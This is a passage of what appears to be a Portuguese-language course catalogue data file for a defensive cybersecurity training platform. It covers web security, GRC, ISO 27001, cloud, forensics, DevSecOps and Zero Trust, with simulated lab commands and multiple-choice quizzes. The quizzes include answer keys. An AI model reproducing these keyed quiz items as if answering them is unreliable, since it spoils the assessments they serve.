        { moduleIndex: 2, title: "Recuperar e aprender", duration: "≈ 16 min", focus: "Encerrar um incidente com monitoramento, comunicação e melhorias verificáveis.", chapters: [{ time: "00:00", title: "Retorno controlado", summary: "Valide serviços e mantenha observação após a recuperação." }, { time: "05:00", title: "Lições sem culpabilização", summary: "Converta observações em melhorias de processo e controle." }, { time: "11:00", title: "Ação acompanhável", summary: "Defina responsável, prazo e evidência para cada melhoria." }], transcript: [{ time: "00:00", text: "Recuperação não é simplesmente religar um serviço: ela inclui validações, monitoramento e comunicação sobre o estado esperado." }, { time: "05:00", text: "Lições aprendidas servem para fortalecer o sistema e o processo; elas devem abordar condições e controles, não buscar culpados." }, { time: "11:00", text: "Uma melhoria tem mais chance de acontecer quando define uma ação específica, um responsável, um prazo e como será verificada." }] },
      ],
    },
  },
  {
    slug: "web-security-owasp", code: "WEB-01", title: "Web Security / OWASP", shortTitle: "Web Security / OWASP", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Autenticação, autorização e riscos comuns em aplicações web com foco seguro.", focus: "Princípios de design seguro, proteção de sessão e validação de entradas em aplicações web.",
    outcomes: ["Diferenciar autenticação, autorização e gestão de sessão.", "Reconhecer riscos de validação de entrada e configuração insegura.", "Propor controles preventivos em revisões de aplicação."],
    modules: [
      { title: "Identidade no aplicativo", lessons: 4, description: "Autenticação, MFA, autorização e limites de acesso por função." },
      { title: "Dados e sessões protegidos", lessons: 5, description: "Validação de entrada, sessões, segredos e tratamento seguro de erros." },
      { title: "Revisão segura por design", lessons: 5, description: "Modelagem de ameaça, dependências e critérios de revisão responsável." },
    ],
    labsList: [
      { title: "Revisão de controle de acesso", description: "Analise regras de função em uma aplicação fictícia.", objective: "Identificar uma permissão excessiva e propor um controle corretivo.", command: "revisar-acesso-web --perfil suporte --recurso faturamento", output: "Permissão atual: edição\nPermissão esperada: leitura\nRecomendação: aplicar autorização no servidor por função" },
      { title: "Checklist de sessão", description: "Valide atributos de sessão em um cenário de laboratório.", objective: "Relacionar proteção de sessão a boas práticas de aplicação.", command: "validar-sessao --ambiente app-treino --atributos secure,httponly,samesite", output: "Secure: ativo\nHttpOnly: ativo\nSameSite: Lax\nResultado: configuração adequada para o cenário" },
    ],
    assessment: "Avaliação de identidade, sessões, validação e design seguro de aplicações web.",
    assessmentQuestions: [
      { id: "web-1", prompt: "Autorização determina:", options: ["O que uma identidade pode acessar", "Quem informou uma senha", "O tamanho do log", "A cor da interface"], correctAnswer: 0, explanation: "Autorização define permissões após a identidade ser autenticada." },
      { id: "web-2", prompt: "Qual atributo ajuda a reduzir acesso de scripts ao cookie de sessão?", options: ["HttpOnly", "Público", "Aberto", "Compartilhado"], correctAnswer: 0, explanation: "HttpOnly impede acesso ao cookie por scripts executados no navegador." },
      { id: "web-3", prompt: "Validação de entrada deve ocorrer:", options: ["No servidor e conforme regras esperadas", "Somente no navegador", "Somente após erro", "Nunca"], correctAnswer: 0, explanation: "A validação no servidor é essencial porque o cliente não é uma fronteira confiável." },
      { id: "web-4", prompt: "Menor privilégio em uma aplicação significa:", options: ["Permitir apenas o necessário por função", "Dar acesso administrativo padrão", "Desativar auditoria", "Compartilhar sessão"], correctAnswer: 0, explanation: "Permissões mínimas reduzem a exposição de dados e ações sensíveis." },
      { id: "web-5", prompt: "Modelagem de ameaça auxilia a:", options: ["Antecipar riscos e controles no design", "Substituir testes", "Apagar requisitos", "Remover registros"], correctAnswer: 0, explanation: "Ela ajuda a pensar em riscos e controles antes da implementação." },
    ],
  },
  {
    slug: "grc-fundamentals", code: "GRC-01", title: "GRC Fundamentals", shortTitle: "GRC Fundamentals", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "Governança, risco, compliance, políticas e controles para segurança organizacional.", focus: "Conexão entre objetivos de negócio, risco, políticas e controles de segurança mensuráveis.",
    outcomes: ["Explicar a relação entre governança, risco e compliance.", "Registrar riscos com probabilidade, impacto e tratamento.", "Relacionar políticas a controles e evidências de conformidade."],
    modules: [
      { title: "Governança e responsabilidade", lessons: 4, description: "Papéis, decisões, políticas e alinhamento com objetivos organizacionais." },
      { title: "Risco na prática", lessons: 4, description: "Ativos, cenários, impacto, probabilidade e opções de tratamento." },
      { title: "Compliance e evidências", lessons: 4, description: "Controles, auditoria, indicadores e melhoria de políticas." },
    ],
    labsList: [
      { title: "Registro de risco", description: "Estruture um risco de acesso indevido em uma empresa fictícia.", objective: "Relacionar ativo, ameaça, controle e proprietário do risco.", command: "registrar-risco --ativo dados-clientes --cenario acesso-indevido", output: "Impacto: alto\nProbabilidade: média\nTratamento: reduzir\nControles: MFA, revisão de acesso e logs\nProprietário: segurança" },
      { title: "Mapa de política", description: "Relacione uma política de acesso a evidências de conformidade.", objective: "Mostrar como uma política se torna controle verificável.", command: "mapear-politica --tema acesso --evidencias revisao-trimestral,logs", output: "Política: controle de acesso\nEvidências: revisão trimestral e logs\nIndicador: acessos revisados no prazo" },
    ],
    assessment: "Avaliação de risco, políticas, controles, evidências e governança.",
    assessmentQuestions: [
      { id: "grc-1", prompt: "Governança de segurança define principalmente:", options: ["Direção, responsabilidades e supervisão", "Somente ferramentas", "Apenas senhas", "Uma marca de firewall"], correctAnswer: 0, explanation: "Governança orienta decisões, papéis e a supervisão de segurança." },
      { id: "grc-2", prompt: "Risco pode ser entendido como:", options: ["Possibilidade de impacto em objetivos", "Um log apagado", "Somente uma ameaça", "Um certificado"], correctAnswer: 0, explanation: "Risco relaciona incerteza, impacto e objetivos organizacionais." },
      { id: "grc-3", prompt: "Uma evidência de controle é útil para:", options: ["Demonstrar que o controle foi executado", "Substituir a política", "Ocultar auditoria", "Aumentar privilégio"], correctAnswer: 0, explanation: "Evidências suportam auditorias e mostram a operação efetiva de um controle." },
      { id: "grc-4", prompt: "Tratar um risco pode incluir:", options: ["Reduzir, aceitar, transferir ou evitar", "Ignorar sempre", "Apagar registros", "Remover responsáveis"], correctAnswer: 0, explanation: "As opções dependem do contexto, apetite ao risco e custo do tratamento." },
      { id: "grc-5", prompt: "Políticas são mais úteis quando:", options: ["Têm responsáveis e controles associados", "São secretas e não aplicadas", "Substituem treinamentos", "Eliminam revisão"], correctAnswer: 0, explanation: "Políticas efetivas precisam ser comunicadas, aplicadas e verificadas por controles." },
    ],
  },
  {
    slug: "iso-27001", code: "ISO-01", title: "ISO 27001", shortTitle: "ISO 27001", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "ISMS, gestão de riscos, controles e melhoria contínua em um programa de segurança.", focus: "Compreensão aplicada de um SGSI, ciclo de melhoria e tratamento de riscos.",
    outcomes: ["Reconhecer elementos de um SGSI baseado em risco.", "Relacionar escopo, objetivos, riscos e controles.", "Explicar a importância de auditoria e melhoria contínua."],
    modules: [
      { title: "Fundamentos do SGSI", lessons: 4, description: "Contexto, escopo, liderança, políticas e objetivos de segurança." },
      { title: "Risco e controles", lessons: 5, description: "Avaliação, tratamento, seleção de controles e declaração de aplicabilidade." },
      { title: "Avaliar e melhorar", lessons: 5, description: "Métricas, auditoria interna, revisão pela direção e ações corretivas." },
    ],
    labsList: [
      { title: "Definição de escopo", description: "Delimite o SGSI de uma unidade fictícia.", objective: "Registrar fronteiras, partes interessadas e serviços cobertos.", command: "definir-escopo-sgsi --unidade operacoes-digitais --fronteiras documentadas", output: "Escopo: operações digitais\nServiços: portal e identidade\nPartes interessadas: clientes, operação e auditoria\nFronteiras: documentadas" },
      { title: "Plano de tratamento", description: "Associe um risco a controles e acompanhamento.", objective: "Produzir um tratamento rastreável e revisável.", command: "tratar-risco --id RSK-ISO-04 --controle acesso-privilegiado", output: "Risco: acesso privilegiado indevido\nTratamento: reduzir\nControle: revisão de acesso\nMétrica: revisões concluídas no prazo" },
    ],
    assessment: "Avaliação de SGSI, escopo, riscos, controles e melhoria contínua.",
    assessmentQuestions: [
      { id: "iso-1", prompt: "Um SGSI é orientado principalmente por:", options: ["Riscos e objetivos organizacionais", "Uma única ferramenta", "Somente incidentes", "Mudar senhas diariamente"], correctAnswer: 0, explanation: "O sistema de gestão conecta segurança ao contexto e aos riscos da organização." },
      { id: "iso-2", prompt: "O escopo do SGSI descreve:", options: ["O que está coberto pelo sistema", "Somente a sala do servidor", "O tamanho das senhas", "Uma lista de fornecedores"], correctAnswer: 0, explanation: "Escopo estabelece fronteiras, processos e partes relevantes para o SGSI." },
      { id: "iso-3", prompt: "Auditoria interna serve para:", options: ["Avaliar conformidade e eficácia", "Ocultar não conformidades", "Criar ataques", "Substituir gestão"], correctAnswer: 0, explanation: "Auditorias verificam se requisitos e controles estão sendo cumpridos adequadamente." },
      { id: "iso-4", prompt: "A melhoria contínua ocorre quando a organização:", options: ["Usa resultados para corrigir e evoluir", "Ignora métricas", "Remove registros", "Evita revisão"], correctAnswer: 0, explanation: "Métricas, auditorias e incidentes geram insumos para melhorias verificáveis." },
      { id: "iso-5", prompt: "Uma declaração de aplicabilidade relaciona:", options: ["Controles selecionados e justificativas", "Somente senhas", "Somente backups", "Apenas treinamento"], correctAnswer: 0, explanation: "Ela documenta os controles aplicáveis e suas justificativas no tratamento de risco." },
    ],
  },
  {
    slug: "nist-cis-controls", code: "CTRL-01", title: "NIST + CIS Controls", shortTitle: "NIST + CIS", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Frameworks e controles para organizar, priorizar e medir uma estratégia defensiva.", focus: "Uso responsável de frameworks para priorizar capacidades defensivas e medir evolução.",
    outcomes: ["Diferenciar um framework de uma lista isolada de ferramentas.", "Relacionar funções do NIST CSF a atividades defensivas.", "Usar controles CIS para priorizar ações de redução de risco."],
    modules: [
      { title: "Frameworks como linguagem", lessons: 4, description: "Objetivos, perfis, priorização e comunicação entre áreas." },
      { title: "NIST CSF aplicado", lessons: 4, description: "Governar, identificar, proteger, detectar, responder e recuperar." },
      { title: "CIS Controls e métricas", lessons: 4, description: "Salvaguardas, inventário, configuração segura e indicadores." },
    ],
    labsList: [
      { title: "Perfil defensivo", description: "Compare o estado atual e desejado de uma capacidade fictícia.", objective: "Priorizar uma melhoria com base em risco e objetivo de negócio.", command: "comparar-perfil --funcao detectar --capacidade logs-centralizados", output: "Estado atual: parcial\nEstado alvo: consistente\nLacuna: cobertura de endpoints\nPrioridade: alta" },
      { title: "Plano de controles", description: "Associe uma salvaguarda CIS a uma necessidade de inventário.", objective: "Definir uma ação mensurável de melhoria defensiva.", command: "priorizar-controle --tema inventario-ativos --metrica cobertura", output: "Controle: inventário de ativos\nMétrica: % de ativos conhecidos\nCadência: semanal\nDono: operações de TI" },
    ],
    assessment: "Avaliação de frameworks, NIST CSF, controles CIS e medição de capacidade.",
    assessmentQuestions: [
      { id: "ctrl-1", prompt: "Um framework de segurança ajuda a:", options: ["Organizar e comunicar capacidades", "Eliminar todo risco", "Substituir pessoas", "Remover auditoria"], correctAnswer: 0, explanation: "Frameworks oferecem uma linguagem estruturada para priorização e evolução." },
      { id: "ctrl-2", prompt: "No NIST CSF, Detect está relacionado a:", options: ["Encontrar sinais de eventos de segurança", "Criar ativos", "Excluir backups", "Mudar fornecedores"], correctAnswer: 0, explanation: "A função Detect foca em identificar possíveis eventos de cibersegurança." },
      { id: "ctrl-3", prompt: "Inventário de ativos é valioso porque:", options: ["Você não protege o que não conhece", "Remove a necessidade de logs", "Substitui MFA", "Elimina vulnerabilidades"], correctAnswer: 0, explanation: "Conhecer ativos é pré-requisito para aplicar e medir controles adequados." },
      { id: "ctrl-4", prompt: "Uma métrica útil para controle deve ser:", options: ["Mensurável e ligada a um objetivo", "Somente estética", "Secreta", "Impossível de revisar"], correctAnswer: 0, explanation: "Métricas objetivas permitem acompanhar se uma capacidade está evoluindo." },
      { id: "ctrl-5", prompt: "Priorizar controles deve considerar:", options: ["Risco, contexto e recursos", "Apenas tendências", "Cor da interface", "Uma única ferramenta"], correctAnswer: 0, explanation: "Controles devem ser priorizados conforme risco e realidade operacional." },
    ],
  },
  {
    slug: "cloud-security-fundamentals", code: "CLOUD-01", title: "Cloud Security Fundamentals", shortTitle: "Cloud Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "network",
    description: "Responsabilidade compartilhada, IAM, redes e logging em ambientes cloud.", focus: "Fundamentos de identidade, configuração, observabilidade e proteção de dados na nuvem.",
    outcomes: ["Explicar o modelo de responsabilidade compartilhada.", "Aplicar princípios de IAM e menor privilégio em cloud.", "Relacionar redes, KMS e logs a uma postura defensiva."],
    modules: [
      { title: "Responsabilidade compartilhada", lessons: 4, description: "O que é gerenciado pelo provedor e o que permanece com o cliente." },
      { title: "Identidade e rede", lessons: 5, description: "IAM, funções, menor privilégio, segmentação e acesso administrativo." },
      { title: "Dados e observabilidade", lessons: 5, description: "KMS, logs, configuração segura e investigação em ambiente cloud." },
    ],
    labsList: [
      { title: "Revisão IAM", description: "Avalie uma função de acesso para um serviço de treinamento.", objective: "Identificar uma permissão excessiva e recomendar menor privilégio.", command: "revisar-iam --funcao relatorio --recurso bucket-treino", output: "Permissão atual: leitura e exclusão\nNecessidade: leitura\nRecomendação: remover exclusão e revisar concessão" },
      { title: "Cobertura de logs", description: "Planeje observabilidade para uma carga de trabalho fictícia.", objective: "Relacionar logs de identidade, atividade e rede a uma investigação futura.", command: "planejar-cloud-logs --workload portal-treino --fontes iam,atividade,rede", output: "IAM: habilitado\nAtividade: habilitada\nRede: habilitada\nRetenção: 90 dias\nCobertura: adequada para o cenário" },
    ],
    assessment: "Avaliação de responsabilidade compartilhada, IAM, redes, KMS e logs cloud.",
    assessmentQuestions: [
      { id: "cloud-1", prompt: "No modelo de responsabilidade compartilhada, o cliente continua responsável por:", options: ["Configurações e identidades que administra", "Toda a infraestrutura física", "Nada relacionado a dados", "Somente o domínio"], correctAnswer: 0, explanation: "O provedor e o cliente possuem responsabilidades diferentes, e o cliente mantém controles sobre sua configuração e dados." },
      { id: "cloud-2", prompt: "IAM aplica principalmente:", options: ["Identidade, autenticação e autorização", "Compressão de arquivo", "Troca de hardware", "Exclusão de logs"], correctAnswer: 0, explanation: "IAM controla quem acessa quais recursos e sob quais condições." },
      { id: "cloud-3", prompt: "KMS está associado a:", options: ["Gestão de chaves criptográficas", "Monitor físico", "Tabela de banco", "Fila de alertas"], correctAnswer: 0, explanation: "Serviços de gerenciamento de chaves apoiam proteção de dados criptografados." },
      { id: "cloud-4", prompt: "Uma boa prática para funções cloud é:", options: ["Conceder apenas permissões necessárias", "Usar administrador para tudo", "Desativar registros", "Compartilhar chaves"], correctAnswer: 0, explanation: "Menor privilégio reduz o impacto de uma credencial ou função comprometida." },
      { id: "cloud-5", prompt: "Logs cloud são importantes para:", options: ["Visibilidade, investigação e auditoria", "Substituir backups", "Evitar revisões", "Criar permissões"], correctAnswer: 0, explanation: "Telemetria adequada permite observar atividades e apoiar resposta a incidentes." },
    ],
  },
  {
    slug: "aws-security-fundamentals", code: "AWS-SEC-01", title: "AWS Security — Fundamentos", shortTitle: "AWS Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "network",
    description: "Identidade, redes, logs e proteção de dados nos principais serviços AWS.", focus: "Postura de segurança baseada em IAM, menor privilégio, visibilidade e configuração responsável na AWS.",
    outcomes: ["Aplicar princípios de menor privilégio com IAM e funções.", "Relacionar redes, chaves e armazenamento a controles de proteção.", "Planejar evidências de auditoria com CloudTrail e logs de serviços."],
    modules: [
      { title: "Identidade e acesso na AWS", lessons: 4, description: "Usuários, funções, políticas, MFA e permissões temporárias." },
      { title: "Proteção de redes e dados", lessons: 5, description: "VPC, grupos de segurança, criptografia e armazenamento protegido." },
      { title: "Visibilidade e postura", lessons: 5, description: "CloudTrail, configuração, alertas e revisão contínua de acesso." },
    ],
    labsList: [
      { title: "Revisão de política IAM", description: "Avalie uma política fictícia concedida a uma função de relatório.", objective: "Identificar uma permissão excessiva e propor o privilégio mínimo necessário.", command: "revisar-aws-iam --funcao relatorio --recurso bucket-treino", output: "Permissão atual: leitura e exclusão\nNecessidade: leitura\nRecomendação: remover exclusão e registrar revisão" },
      { title: "Plano de trilha de auditoria", description: "Defina evidências de atividade para uma carga de trabalho de treinamento.", objective: "Relacionar registros de identidade e atividade a uma investigação futura.", command: "planejar-aws-logs --fontes cloudtrail,config,vpc-flow", output: "CloudTrail: habilitado\nAWS Config: habilitado\nVPC Flow Logs: habilitado\nRetenção: 90 dias" },
    ],
    assessment: "Avaliação de IAM, redes, proteção de dados e observabilidade na AWS.",
    assessmentQuestions: [
      { id: "aws-1", prompt: "Uma função IAM é útil porque:", options: ["Concede permissões temporárias conforme a necessidade", "Elimina a necessidade de auditoria", "Substitui criptografia", "Expõe chaves permanentemente"], correctAnswer: 0, explanation: "Funções permitem acesso temporário e controlado sem distribuir credenciais permanentes." },
      { id: "aws-2", prompt: "O princípio de menor privilégio recomenda:", options: ["Conceder somente o acesso necessário", "Dar permissão administrativa por padrão", "Compartilhar credenciais", "Desativar MFA"], correctAnswer: 0, explanation: "Permissões mínimas reduzem a superfície de impacto de erros e comprometimentos." },
      { id: "aws-3", prompt: "CloudTrail apoia principalmente:", options: ["Registro de atividades para auditoria e investigação", "Compressão de arquivos", "Criação de senhas", "Substituição de backups"], correctAnswer: 0, explanation: "A trilha registra chamadas e atividades relevantes para análise e auditoria." },
      { id: "aws-4", prompt: "Grupos de segurança ajudam a:", options: ["Controlar tráfego permitido para recursos", "Gerar certificados automaticamente", "Excluir logs", "Aumentar acesso de todos"], correctAnswer: 0, explanation: "Eles definem regras de entrada e saída associadas a recursos na rede." },
      { id: "aws-5", prompt: "Uma boa prática para dados em S3 é:", options: ["Revisar acesso e aplicar criptografia adequada", "Tornar o bucket público por padrão", "Desativar logs", "Usar uma única conta compartilhada"], correctAnswer: 0, explanation: "Acesso revisado e criptografia apoiam a proteção de dados armazenados." },
    ],
  },
  {
    slug: "azure-security-fundamentals", code: "AZ-SEC-01", title: "Azure Security — Fundamentos", shortTitle: "Azure Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "network",
    description: "Identidade, acesso condicional, rede, postura e logs em ambientes Microsoft Azure.", focus: "Controles de identidade e configuração para proteger workloads Azure com visibilidade e responsabilidade compartilhada.",
    outcomes: ["Explicar como Entra ID, RBAC e MFA reduzem risco de acesso.", "Relacionar grupos de segurança de rede e segmentação a controles defensivos.", "Usar recomendações e logs como apoio à melhoria de postura."],
    modules: [
      { title: "Identidade e autorização", lessons: 4, description: "Entra ID, MFA, RBAC, funções e revisões de acesso." },
      { title: "Redes e workloads protegidos", lessons: 5, description: "NSG, segmentação, chaves, segredos e proteção de dados." },
      { title: "Postura e monitoramento", lessons: 5, description: "Defender for Cloud, Activity Log, alertas e recomendações." },
    ],
    labsList: [
      { title: "Revisão RBAC", description: "Analise a função fictícia de uma pessoa que consulta relatórios.", objective: "Substituir privilégio amplo por uma função com escopo adequado.", command: "revisar-azure-rbac --perfil analista-relatorios --escopo assinatura-treino", output: "Função atual: Owner\nNecessidade: Reader\nRecomendação: reduzir escopo e revisar em 90 dias" },
      { title: "Mapa de logs Azure", description: "Defina registros essenciais para um serviço de treinamento.", objective: "Criar uma cobertura inicial de auditoria e investigação.", command: "mapear-azure-logs --fontes activity-log,entra,defender", output: "Activity Log: habilitado\nLogs de identidade: habilitados\nAlertas de postura: acompanhados" },
    ],
    assessment: "Avaliação de identidade, RBAC, rede, postura e observabilidade no Azure.",
    assessmentQuestions: [
      { id: "azure-1", prompt: "RBAC é usado principalmente para:", options: ["Atribuir permissões por função e escopo", "Criar malware", "Eliminar registros", "Substituir MFA"], correctAnswer: 0, explanation: "O RBAC organiza autorizações conforme funções e o escopo de recursos." },
      { id: "azure-2", prompt: "MFA reduz risco porque:", options: ["Exige um fator adicional além da senha", "Dispensa identidade", "Remove a necessidade de logs", "Torna todo acesso público"], correctAnswer: 0, explanation: "Um fator adicional diminui a chance de uma senha isolada permitir acesso indevido." },
      { id: "azure-3", prompt: "Um NSG contribui para:", options: ["Controlar fluxos de rede permitidos", "Criar certificados", "Apagar dados", "Compartilhar chaves"], correctAnswer: 0, explanation: "Grupos de segurança de rede filtram tráfego conforme regras definidas." },
      { id: "azure-4", prompt: "O Activity Log é relevante para:", options: ["Acompanhar operações no ambiente", "Substituir backups", "Editar documentos", "Desativar controles"], correctAnswer: 0, explanation: "Ele fornece visibilidade sobre operações administrativas e eventos da plataforma." },
      { id: "azure-5", prompt: "Recomendações de postura devem ser tratadas como:", options: ["Insumos priorizados por risco e contexto", "Correções cegas e automáticas", "Itens sem relevância", "Substitutos de revisão humana"], correctAnswer: 0, explanation: "Recomendações precisam de contexto para serem priorizadas e aplicadas com segurança." },
    ],
  },
  {
    slug: "digital-forensics-fundamentals", code: "DFIR-01", title: "Forense Digital — Fundamentos", shortTitle: "Forense Digital", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 3, quizCount: 5, accent: "cyan", icon: "shield",
    description: "Preservação de evidências, linha do tempo, cadeia de custódia e análise inicial em cenários simulados.", focus: "Investigação responsável que protege a integridade de evidências e comunica conclusões com limites claros.",
    outcomes: ["Diferenciar coleta, preservação e análise de evidências digitais.", "Montar uma linha do tempo a partir de registros consistentes.", "Registrar cadeia de custódia e conclusões sem extrapolar os fatos."],
    modules: [
      { title: "Fundamentos de evidência", lessons: 4, description: "Escopo, legalidade, integridade, hashes e cadeia de custódia." },
      { title: "Coleta e linha do tempo", lessons: 5, description: "Fontes de artefatos, horários, cópias de trabalho e correlação." },
      { title: "Análise e comunicação", lessons: 5, description: "Hipóteses, documentação, limites de conclusão e relatório técnico." },
    ],
    labsList: [
      { title: "Registro de cadeia de custódia", description: "Documente a coleta de um artefato fictício de endpoint.", objective: "Manter rastreabilidade de quem manipulou a evidência e quando.", command: "registrar-cadeia-custodia --evidencia endpoint-lab-03 --hash verificado", output: "Evidência: endpoint-lab-03\nIntegridade: hash verificado\nCópia de trabalho: criada\nCustódia: registrada" },
      { title: "Linha do tempo de evento", description: "Ordene eventos de autenticação de um cenário de laboratório.", objective: "Separar observações verificáveis de hipóteses de investigação.", command: "montar-linha-tempo --caso DFIR-LAB-12 --fontes auth,endpoint", output: "08:41: autenticação registrada\n08:44: processo incomum observado\nPróximo passo: coletar contexto de execução" },
      { title: "Correlação de logs para linha do tempo", description: "Correlacione logs fictícios de identidade e endpoint em uma investigação preservada.", objective: "Montar uma sequência factual de eventos e documentar lacunas antes de uma conclusão.", command: "correlacionar-evidencias --caso DFIR-LAB-18 --fontes identidade,endpoint --timezone UTC", output: "08:41: login registrado\n08:44: execução observada no endpoint\n08:47: nova sessão de rede\nLacuna: contexto do processo pendente\nLinha do tempo: preservada para revisão" },
    ],
    assessment: "Avaliação de evidências, cadeia de custódia, linha do tempo e comunicação forense.",
    assessmentQuestions: [
      { id: "dfir-1", prompt: "Cadeia de custódia registra:", options: ["Como a evidência foi preservada e manipulada", "Somente a opinião do analista", "Senhas de usuários", "A remoção de logs"], correctAnswer: 0, explanation: "Ela mantém a rastreabilidade da evidência desde a coleta até a análise." },
      { id: "dfir-2", prompt: "Um hash de evidência é útil para:", options: ["Verificar integridade do arquivo", "Criar acesso administrativo", "Eliminar cópias", "Substituir documentação"], correctAnswer: 0, explanation: "A comparação de hashes ajuda a verificar se o conteúdo permaneceu inalterado." },
      { id: "dfir-3", prompt: "Uma linha do tempo bem montada depende de:", options: ["Timestamps e fontes documentadas", "Suposições sem registro", "Logs apagados", "Memória de uma pessoa"], correctAnswer: 0, explanation: "Horários e fontes claros permitem ordenar acontecimentos de maneira auditável." },
      { id: "dfir-4", prompt: "Na análise forense, uma boa conclusão deve:", options: ["Distinguir fatos observados de hipóteses", "Declarar certeza sem evidência", "Ocultar limitações", "Excluir artefatos"], correctAnswer: 0, explanation: "Relatórios confiáveis apresentam o que foi observado e as limitações da análise." },
      { id: "dfir-5", prompt: "Uma cópia de trabalho é usada para:", options: ["Analisar sem alterar a evidência original", "Substituir a preservação", "Distribuir dados sem controle", "Apagar a fonte"], correctAnswer: 0, explanation: "A análise deve ocorrer em cópias apropriadas, preservando o original." },
    ],
  },
  {
    slug: "devsecops-fundamentals", code: "DEVSEC-01", title: "DevSecOps — Fundamentos", shortTitle: "DevSecOps", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Segurança integrada ao ciclo de entrega, com revisão de código, dependências, segredos e pipelines.", focus: "Práticas de engenharia que aproximam desenvolvimento, operações e segurança sem transferir responsabilidade entre equipes.",
    outcomes: ["Relacionar segurança às etapas de planejamento, código, build e implantação.", "Identificar riscos comuns de dependências, segredos e configurações de pipeline.", "Propor verificações proporcionais ao risco no fluxo de entrega."],
    modules: [
      { title: "Segurança no ciclo de entrega", lessons: 4, description: "Responsabilidades compartilhadas, requisitos e modelagem de ameaça leve." },
      { title: "Código, dependências e segredos", lessons: 5, description: "Revisão, SAST, componentes, segredos e gestão de vulnerabilidades." },
      { title: "Pipelines e implantação", lessons: 5, description: "Controles de CI/CD, aprovações, ambiente e monitoramento pós-release." },
    ],
    labsList: [
      { title: "Checklist de pipeline", description: "Revise um pipeline fictício de entrega de aplicação.", objective: "Identificar controles mínimos para dependências, segredos e aprovação de release.", command: "revisar-pipeline --projeto app-treino --controles dependencias,segredos,aprovacao", output: "Dependências: verificação habilitada\nSegredos: variáveis protegidas\nRelease: aprovação exigida\nLacuna: registrar evidência de revisão" },
      { title: "Triagem de dependência", description: "Classifique uma dependência sinalizada em um projeto de treinamento.", objective: "Priorizar a análise por exposição e versão antes de uma decisão de correção.", command: "triar-dependencia --componente biblioteca-treino --ambiente homologacao", output: "Exposição: interna\nVersão afetada: identificada\nAção: validar atualização em homologação" },
    ],
    assessment: "Avaliação de ciclo de entrega, segredos, dependências e controles de CI/CD.",
    assessmentQuestions: [
      { id: "devsec-1", prompt: "DevSecOps busca principalmente:", options: ["Integrar segurança ao fluxo de entrega", "Transferir toda segurança para uma equipe", "Eliminar revisões", "Publicar segredos"], correctAnswer: 0, explanation: "A prática distribui a segurança ao longo do ciclo de desenvolvimento e operações." },
      { id: "devsec-2", prompt: "Segredos em um pipeline devem:", options: ["Ser protegidos por mecanismos apropriados", "Ficar no código-fonte", "Ser enviados em mensagens", "Ser compartilhados livremente"], correctAnswer: 0, explanation: "Credenciais e tokens devem ser gerenciados fora do código e com controle de acesso." },
      { id: "devsec-3", prompt: "A análise de dependências ajuda a:", options: ["Identificar componentes com risco conhecido", "Substituir testes funcionais", "Ignorar versões", "Aumentar permissões"], correctAnswer: 0, explanation: "Bibliotecas e componentes precisam ser monitorados para orientar atualização e mitigação." },
      { id: "devsec-4", prompt: "Uma aprovação de release pode contribuir para:", options: ["Controlar mudanças sensíveis", "Eliminar rastreabilidade", "Desativar auditoria", "Publicar sem revisão"], correctAnswer: 0, explanation: "Aprovações adequadas ajudam a criar governança e rastreabilidade de mudanças." },
      { id: "devsec-5", prompt: "Verificações de segurança em CI/CD devem ser:", options: ["Proporcionais ao risco e integradas ao processo", "Executadas somente após incidentes", "Sempre ignoradas", "Manuais e sem registro"], correctAnswer: 0, explanation: "Controles integrados e ajustados ao risco reduzem retrabalho e aumentam consistência." },
    ],
  },
  {
    slug: "network-security-zero-trust", code: "NET-SEC-01", title: "Segurança de Redes e Zero Trust", shortTitle: "Redes e Zero Trust", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Segmentação, controle de acesso, DNS, visibilidade e princípios Zero Trust para redes modernas.", focus: "Proteção de comunicações e identidades com verificação contínua, menor privilégio e telemetria útil.",
    outcomes: ["Explicar como segmentação reduz movimento lateral e exposição.", "Relacionar DNS, controle de acesso e logs a uma investigação de rede.", "Aplicar princípios Zero Trust sem depender apenas do perímetro."],
    modules: [
      { title: "Fundamentos de defesa de rede", lessons: 4, description: "Ativos, fluxos, superfícies expostas, DNS e filtragem de tráfego." },
      { title: "Segmentação e acesso", lessons: 5, description: "VLANs, políticas, acesso administrativo e menor privilégio em rede." },
      { title: "Zero Trust e visibilidade", lessons: 5, description: "Verificação explícita, contexto, telemetria e resposta a anomalias." },
    ],
    labsList: [
      { title: "Mapa de segmentação", description: "Separe fluxos de uma organização fictícia em zonas de rede.", objective: "Reduzir comunicação desnecessária entre usuários, serviços e administração.", command: "mapear-segmentacao --ambiente empresa-treino --zonas usuarios,servicos,admin", output: "Zona usuários: acesso a serviços aprovados\nZona serviços: comunicação restrita\nZona admin: acesso com MFA e registro" },
      { title: "Triagem de DNS", description: "Avalie uma consulta DNS incomum em dados de treinamento.", objective: "Definir dados adicionais necessários antes de concluir que há atividade maliciosa.", command: "triar-dns --evento dominio-incomum --fontes dns,proxy,endpoint", output: "Sinal: domínio raro\nContexto necessário: processo e usuário\nAção: enriquecer antes de classificar" },
    ],
    assessment: "Avaliação de segmentação, acesso, DNS, Zero Trust e telemetria de rede.",
    assessmentQuestions: [
      { id: "netsec-1", prompt: "Segmentação de rede ajuda a:", options: ["Limitar comunicação e reduzir exposição", "Dar acesso irrestrito", "Eliminar a necessidade de logs", "Substituir identidade"], correctAnswer: 0, explanation: "Separar zonas e fluxos reduz caminhos desnecessários entre ativos." },
      { id: "netsec-2", prompt: "Zero Trust recomenda:", options: ["Verificar acesso com contexto e menor privilégio", "Confiar automaticamente na rede interna", "Desativar MFA", "Usar uma única conta"], correctAnswer: 0, explanation: "O modelo evita confiança implícita baseada apenas na localização de rede." },
